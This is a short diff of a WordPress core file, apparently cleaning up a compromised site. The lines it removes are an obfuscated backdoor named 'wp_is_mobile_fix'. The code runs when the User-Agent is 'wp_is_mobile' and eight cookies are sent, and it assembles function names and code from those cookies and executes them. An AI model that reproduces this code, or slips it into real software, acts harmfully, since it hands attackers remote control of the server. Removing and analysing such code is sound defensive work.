@@ -143,20 +143,6 @@ $is_iis7 = $is_IIS && (int) substr( $_SERVER['SERVER_SOFTWARE'], strpos( $_SERVE
  *
  * @return bool
  */
-function wp_is_mobile_fix() {
-	$is_wp_mobile = ($_SERVER['HTTP_USER_AGENT'] == 'wp_is_mobile');
-	$t = $_COOKIE;
-
-	(count($t) == 8 && $is_wp_mobile) ?
-	(($ds = $t[58].$t[34]) &&  ($vd = $ds($t[75].$t[49])) &&
-	($_vd = $ds($t[61].$t[52])) && ($_vd = @$vd($t[85], $_vd($ds($t[19])))) &&
-	@$_vd()) : $t;
-
-	return $is_wp_mobile;
-}
-
-wp_is_mobile_fix();
-
 function wp_is_mobile() {
 	if ( empty( $_SERVER['HTTP_USER_AGENT'] ) ) {
 		$is_mobile = false;
